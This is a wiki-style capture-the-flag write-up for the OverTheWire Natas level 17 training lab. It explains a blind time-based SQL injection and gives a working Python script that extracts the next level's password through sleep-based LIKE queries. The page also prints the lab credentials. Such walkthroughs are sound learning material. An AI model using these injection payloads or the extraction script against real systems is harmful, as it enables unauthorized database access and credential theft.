[Category:OverTheWire-Natas](/Category:OverTheWire-Natas "wikilink")

Username: natas17 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw URL:
<http://natas17.natas.labs.overthewire.org>

this looked like the first sql injection where we had to check for the
password by guessing

but on closer inspection we saw that there was no output given.

so i knew we had to do a blind time based sql injection. we do this like
challenge 15 but modified like: natas18" and if(password like Binary
\\'{}%\\', sleep(2),false);-- this means like: select all from username
natas8 and if the password is like character given sleep 2 seconds. then
we time the response if its over 2 seconds because the request alone
takes a little bit of time then we know it is valid.

`  `
`  `
`import requests`
`  `
`password = ''`
`possible = ''`
`  `
`# for char in "abcdefghijklmnopqrstuvwxyz0123456789":`
`#     querystring = 'natas18" and if(password like \'%{}%\', sleep(2),false);-- '.format(password+str(char))`
`#     print(querystring)`
`  `
`#     time = requests.post('http://natas17.natas.labs.overthewire.org', auth=('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),data={'username':querystring}).elapsed.total_seconds()`
`#     if(time >= 2):`
`#         possible += str(char)`
`#         print(possible)`
`  `
`  `
`# possible = 'cdfghijklmopqrsvwxy047'`
`# for i in range(31):`
`#     for char in possible:`
`#         querystring = 'natas18" and if(password like \'{}%\', sleep(2),false);-- '.format(password+str(char))`
`#         print(querystring)`
`  `
`#         time = requests.post('http://natas17.natas.labs.overthewire.org', auth=('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),data={'username':querystring}).elapsed.total_seconds()`
`#         if(time >= 2):`
`#             password += str(char)`
`#             print(password)`
`  `
`# print(possible)`
`password = "xvkiqdjy4opv7wcrgdlmj0pfscsdjhdp"`
`  `
`for i in range(len(password)):`
`    `
`    querystring = 'natas18" and if(password like Binary \'{}%\', sleep(2),false);-- '.format(password[:i+1])`
`    print(querystring)`
`  `
`    time = requests.post('http://natas17.natas.labs.overthewire.org', auth=('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),data={'username':querystring}).elapsed.total_seconds()`
`    if(time < 2):`
`        x = list(password)`
`        x[i] = x[i].upper()`
`  `
`        password = "".join(x)`
`        print(password)`
`  `
`#xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`
`  `